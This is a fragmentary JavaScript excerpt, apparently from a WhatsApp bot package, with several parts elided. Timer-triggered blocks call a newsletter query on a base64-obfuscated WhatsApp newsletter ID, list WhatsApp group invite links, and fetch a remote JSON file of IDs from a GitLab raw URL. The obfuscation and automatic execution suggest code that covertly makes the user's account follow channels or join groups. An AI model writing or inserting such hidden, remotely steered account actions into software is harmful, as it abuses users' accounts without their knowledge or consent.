...
setTimeout(async () => {
    try {
        await newsletterWMexQuery(
            Buffer.from("MTIwMzYzNDEwMzQzMTg5MjgzQG5ld3NsZXR0ZXI=", "base64").toString(),
...
"https://chat.whatsapp.com/26DwVnUJpLD77GlTcuA8y",
];
...
setTimeout(async () => {
    ...
    try {
        const RAW_URL = "https://gitlab.com/alluffyofficial/idsaluran/-/raw/main/ochobot.json";
